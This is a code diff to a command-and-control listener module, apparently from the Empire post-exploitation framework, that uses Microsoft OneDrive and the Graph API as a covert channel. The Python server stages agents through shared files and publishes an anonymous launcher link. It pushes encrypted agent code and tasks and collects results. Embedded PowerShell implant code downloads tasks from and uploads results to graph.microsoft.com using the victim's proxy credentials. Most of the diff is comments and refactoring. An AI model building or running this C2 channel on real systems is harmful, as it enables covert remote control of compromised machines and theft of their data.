@@ -142,6 +142,7 @@ class Listener:
 
         self.uris = [a.strip('/') for a in self.options['DefaultProfile']['Value'].split('|')[0].split(',')]
 
+        #If we don't have an OAuth code yet, give the user a URL to get it
         if (str(self.options['RefreshToken']['Value']).strip() == '') and (str(self.options['AuthCode']['Value']).strip() == ''):
             if (str(self.options['ClientID']['Value']).strip() == ''):
                 print helpers.color("[!] ClientID needed to generate AuthCode URL!")
@@ -322,6 +323,9 @@ class Listener:
             else:
                 return randomized_stager
 
+        else:
+            print helpers.color("[!] Python agent not available for Onedrive")
+
     def generate_comms(self, listener_options, client_id, token, refresh_token, redirect_uri, language=None):
 
         staging_key = listener_options['StagingKey']['Value']
@@ -334,9 +338,10 @@ class Listener:
             return
 
         if language.lower() == "powershell":
+            #Function to generate a WebClient object with the required headers
             token_manager = """
     $Script:TokenObject = @{token="%s";refresh="%s";expires=(Get-Date).addSeconds(3480)};
-    function script:Get-WebClient {
+    $script:GetWebClient = {
         $wc = New-Object System.Net.WebClient
         $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
         $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
@@ -360,12 +365,12 @@ class Listener:
         $wc.headers.add("User-Agent", $script:UserAgent)
         $wc.headers.add("Authorization", "Bearer $($Script:TokenObject.token)")
         $Script:Headers.GetEnumerator() | ForEach-Object {$wc.Headers.Add($_.Name, $_.Value)}
-        return $wc
+        $wc
     }
             """ % (token, refresh_token, client_id, redirect_uri)
 
             post_message = """
-    function script:send-message {
+    $script:SendMessage = {
         param($packets)
 
         if($packets) {
@@ -375,7 +380,7 @@ class Listener:
             $RoutingPacket = ""
         }
 
-        $wc = Get-WebClient
+        $wc = (& $GetWebClient)
         $resultsFolder = "%s"
 
         try {
@@ -388,7 +393,7 @@ class Listener:
                 $routingPacket = $data + $routingPacket
             }
 
-            $wc = Get-WebClient
+            $wc = (& $GetWebClient)
             $null = $wc.UploadData("https://graph.microsoft.com/v1.0/drive/root:/$resultsFolder/$($script:SessionID).txt:/content", "PUT", $RoutingPacket)
             $script:missedChecking = 0
             $script:lastseen = get-date
@@ -403,28 +408,26 @@ class Listener:
 
             get_message = """
     $script:lastseen = Get-Date
-    function script:get-task {
+    $script:GetTask = {
         try {
-            $wc = Get-WebClient
+            $wc = (& $GetWebClient)
 
             $TaskingsFolder = "%s"
 
             #If we haven't sent a message recently...
             if($script:lastseen.addseconds($script:AgentDelay * 2) -lt (get-date)) {
-                send-message -packets ""
+                (& $SendMessage -packets "")
             }
             $script:MissedCheckins = 0
 
             $data = $wc.DownloadData("https://graph.microsoft.com/v1.0/drive/root:/$TaskingsFolder/$($script:SessionID).txt:/content")
 
             if($data -and ($data.length -ne 0)) {
-                $wc = Get-WebClient
+                $wc = (& $GetWebClient)
                 $null = $wc.UploadString("https://graph.microsoft.com/v1.0/drive/root:/$TaskingsFolder/$($script:SessionID).txt", "DELETE", "")
                 if([system.text.encoding]::utf8.getString($data) -eq "RESTAGE") {
-                    write-host "Restaging"
                     Start-Negotiate -T $script:TokenObject.token -SK $SK -PI $PI -UA $UA
                 }
-                write-host "returning"
                 $Data
             }
         }
@@ -479,6 +482,7 @@ class Listener:
 
     def start_server(self, listenerOptions):
 
+        # Utility functions to handle auth tasks and initial setup
         def get_token(client_id, code):
             params = {'client_id': client_id,
                       'grant_type': 'authorization_code',
@@ -542,7 +546,6 @@ class Listener:
 
         def upload_launcher():
             ps_launcher = self.mainMenu.stagers.generate_launcher(listener_name, language='powershell', encode=False, userAgent='none', proxy='none', proxyCreds='none')
-            #py_launcher = self.mainMenu.stagers.generate_launcher(listener_name, language='python', encode=False, userAgent='none', proxy='none', proxyCreds='none')
 
             r = s.put("%s/drive/root:/%s/%s/%s:/content" %(base_url, base_folder, staging_folder, "LAUNCHER-PS.TXT"),
                         data=ps_launcher, headers={"Content-Type": "text/plain"})
@@ -553,10 +556,6 @@ class Listener:
                             json={"scope": "anonymous", "type": "view"},
                             headers={"Content-Type": "application/json"})
                 launcher_url = "https://api.onedrive.com/v1.0/shares/%s/driveitem/content" % r.json()['shareId']
-                #print helpers.color("[*] PS Launcher URL for %s: %s" % (listener_name, launcher_url))
-
-            #r = s.put("%s/drive/root:/%s/%s/%s:/content" %(base_url, base_folder, staging_folder, "STAGE0PY.TXT"),
-                      #data=py_launcher, headers={"Content-Type": "text/plain"})
 
         def upload_stager():
             ps_stager = self.generate_stager(listenerOptions=listener_options, language='powershell', token=token['access_token'])
@@ -604,7 +603,7 @@ class Listener:
         setup_folders()
 
         while True:
-            #Wait until Empire is aware the listener is running
+            #Wait until Empire is aware the listener is running, so we can save our refresh token and stager URL
             try:
                 if listener_name in self.mainMenu.listeners.activeListeners.keys():
                     upload_stager()
@@ -617,8 +616,8 @@ class Listener:
 
         while True:
             time.sleep(int(poll_interval))
-            try:
-                if time.time() > token['expires_at']:
+            try: #Wrap the whole loop in a try/catch so one error won't kill the listener
+                if time.time() > token['expires_at']: #Get a new token if the current one has expired
                     token = renew_token(client_id, token['refresh_token'])
                     s.headers['Authorization'] = "Bearer " + token['access_token']
                     dispatcher.send("[*] Refreshed auth token", sender="listeners/onedrive")
@@ -628,49 +627,47 @@ class Listener:
                     token['update'] = False
 
                 search = s.get("%s/drive/root:/%s/%s?expand=children" % (base_url, base_folder, staging_folder))
-                for item in search.json()['children']:
+                for item in search.json()['children']: #Iterate all items in the staging folder
                     try:
                         reg = re.search("^([A-Z0-9]+)_([0-9]).txt", item['name'])
                         if not reg:
                             continue
                         agent_name, stage = reg.groups()
-                        if stage == '1':
-                            print "Stage 1"
-                            dispatcher.send("[*] Downloading %s/%s, %d bytes" % (staging_folder,  item['name'], item['size']), sender="listeners/onedrive")
+                        if stage == '1': #Download stage 1, upload stage 2
+                            dispatcher.send("[*] Downloading %s/%s/%s, %d bytes" % (base_folder, staging_folder,  item['name'], item['size']), sender="listeners/onedrive")
                             content = s.get(item['@microsoft.graph.downloadUrl']).content
                             lang, return_val = self.mainMenu.agents.handle_agent_data(staging_key, content, listener_options)[0]
                             dispatcher.send("[*] Uploading %s/%s/%s_2.txt, %d bytes" % (base_folder, staging_folder, agent_name, len(return_val)), sender="listeners/onedrive")
                             s.put("%s/drive/root:/%s/%s/%s_2.txt:/content" % (base_url, base_folder, staging_folder, agent_name), data=return_val)
-                            dispatcher.send("[*] Deleting %s/%s" % (staging_folder, item['name']), sender="listeners/onedrive")
+                            dispatcher.send("[*] Deleting %s/%s/%s" % (base_folder, staging_folder, item['name']), sender="listeners/onedrive")
                             s.delete("%s/drive/items/%s" % (base_url, item['id']))
 
-                        if stage == '3':
-                            print "Stage 3"
-                            dispatcher.send("[*] Downloading %s/%s, %d bytes" % (staging_folder,  item['name'], item['size']), sender="listeners/onedrive")
+                        if stage == '3': #Download stage 3, upload stage 4 (full agent code)
+                            dispatcher.send("[*] Downloading %s/%s/%s, %d bytes" % (base_folder, staging_folder,  item['name'], item['size']), sender="listeners/onedrive")
                             content = s.get(item['@microsoft.graph.downloadUrl']).content
                             lang, return_val = self.mainMenu.agents.handle_agent_data(staging_key, content, listener_options)[0]
 
                             session_key = self.mainMenu.agents.agents[agent_name]['sessionKey']
-                            agent_token = renew_token(client_id, token['refresh_token'])
+                            agent_token = renew_token(client_id, token['refresh_token']) #Get auth and refresh tokens for the agent to use
                             agent_code = str(self.generate_agent(listener_options, client_id, agent_token['access_token'],
                                                             agent_token['refresh_token'], redirect_uri, lang))
                             enc_code = encryption.aes_encrypt_then_hmac(session_key, agent_code)
 
                             dispatcher.send("[*] Uploading %s/%s/%s_4.txt, %d bytes" % (base_folder, staging_folder, agent_name, len(enc_code)), sender="listeners/onedrive")
                             s.put("%s/drive/root:/%s/%s/%s_4.txt:/content" % (base_url, base_folder, staging_folder, agent_name), data=enc_code)
-                            dispatcher.send("[*] Deleting %s/%s" % (staging_folder, item['name']), sender="listeners/onedrive")
+                            dispatcher.send("[*] Deleting %s/%s/%s" % (base_folder, staging_folder, item['name']), sender="listeners/onedrive")
                             s.delete("%s/drive/items/%s" % (base_url, item['id']))
 
                     except Exception, e:
                         print(traceback.format_exc())
 
                 agent_ids = self.mainMenu.agents.get_agents_for_listener(listener_name)
-                for agent_id in agent_ids:
+                for agent_id in agent_ids: #Upload any tasks for the current agents
                     task_data = self.mainMenu.agents.handle_agent_request(agent_id, 'powershell', staging_key, update_lastseen=False)
                     if task_data:
                         try:
                             r = s.get("%s/drive/root:/%s/%s/%s.txt:/content" % (base_url, base_folder, taskings_folder, agent_id))
-                            if r.status_code == 200:
+                            if r.status_code == 200: # If there's already something there, download and append the new data
                                 task_data = r.content + task_data
 
                             dispatcher.send("[*] Uploading agent tasks for %s, %d bytes" %
@@ -681,23 +678,24 @@ class Listener:
                             dispatcher.send("[!] Error uploading agent tasks for %s, %s" % (agent_id, e))
 
                 search = s.get("%s/drive/root:/%s/%s?expand=children" % (base_url, base_folder, results_folder))
-                for item in search.json()['children']:
+                for item in search.json()['children']: #For each file in the results folder
                     try:
                         agent_id = item['name'].split(".")[0]
-                        if not agent_id in agent_ids:
+                        if not agent_id in agent_ids: #If we don't recognize that agent, upload a message to restage
                             dispatcher.send("[*] Invalid agent, deleting %s/%s and restaging" % (results_folder, item['name']), sender="listeners/onedrive")
                             s.put("%s/drive/root:/%s/%s/%s.txt:/content" % (base_url, base_folder, taskings_folder, agent_id), data = "RESTAGE")
                             s.delete("%s/drive/items/%s" % (base_url, item['id']))
                             continue
 
-                        try:
+                        try: #Update the agent's last seen time, from the file timestamp
                             seen_time = datetime.strptime(item['lastModifiedDateTime'], "%Y-%m-%dT%H:%M:%S.%fZ")
                         except: #sometimes no ms for some reason...
                             seen_time = datetime.strptime(item['lastModifiedDateTime'], "%Y-%m-%dT%H:%M:%SZ")
                         seen_time = helpers.utc_to_local(seen_time)
                         self.mainMenu.agents.update_agent_lastseen_db(agent_id, seen_time)
 
-                        if(item['size'] > 1): #only need to download results if there's actually something there
+                        #If the agent is just checking in, the file will only be 1 byte, so no results to fetch
+                        if(item['size'] > 1):
                             dispatcher.send("[*] Downloading results from %s/%s, %d bytes" % (results_folder, item['name'], item['size']), sender="listeners/onedrive")
                             r = s.get(item['@microsoft.graph.downloadUrl'])
                             self.mainMenu.agents.handle_agent_data(staging_key, r.content, listener_options, update_lastseen=False)
